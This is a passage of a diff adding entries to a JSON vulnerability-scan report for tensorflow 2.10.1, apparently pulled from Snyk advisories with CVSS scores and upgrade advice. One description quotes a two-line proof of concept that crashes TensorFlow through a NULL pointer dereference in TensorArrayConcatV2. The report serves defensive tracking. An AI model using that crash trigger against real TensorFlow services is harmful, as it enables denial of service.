+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3373026",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3373026 - tensorflow"
+        },
+        {
+            "description": "## Overview\n[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.\nAffected versions of this package are vulnerable to NULL Pointer Dereference. When `ctx->step_containter()` is a null ptr, the `Lookup` function will be executed with a null pointer.\n## PoC\n```\r\nimport tensorflow as tf\r\ntf.raw_ops.TensorArrayConcatV2(handle=['a', 'b'], flow_in = 0.1, dtype=tf.int32, element_shape_except0=1)\r\n```\n## Remediation\nUpgrade `tensorflow` to version 2.11.1, 2.12.0 or higher.\n## References\n- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/239139d2ae6a81ae9ba499ad78b56d9b2931538a)",
+            "vulnerability_id": "SNYK-PYTHON-TENSORFLOW-3373005",
+            "name": "SNYK-PYTHON-TENSORFLOW-3373005",
+            "package_name": "tensorflow",
+            "package_details": {
+                "file_path": "usr/local/lib/python3.8/site-packages/tensorflow-2.10.1.dist-info/METADATA",
+                "name": "tensorflow",
+                "package_manager": "PYTHONPKG",
+                "version": "2.10.1",
+                "release": null
+            },
+            "remediation": {
+                "recommendation": {
+                    "text": "None Provided"
+                }
+            },
+            "cvss_v3_score": 7.5,
+            "cvss_v30_score": 0,
+            "cvss_v31_score": 7.5,
+            "cvss_v2_score": 0,
+            "cvss_v3_severity": "HIGH",
+            "source_url": "https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3373005",
+            "source": "SNYK",
+            "severity": "HIGH",
+            "status": "ACTIVE",
+            "title": "IN1-PYTHON-TENSORFLOW-3373005 - tensorflow"
         }
     ],
     "golang.org/x/net": [
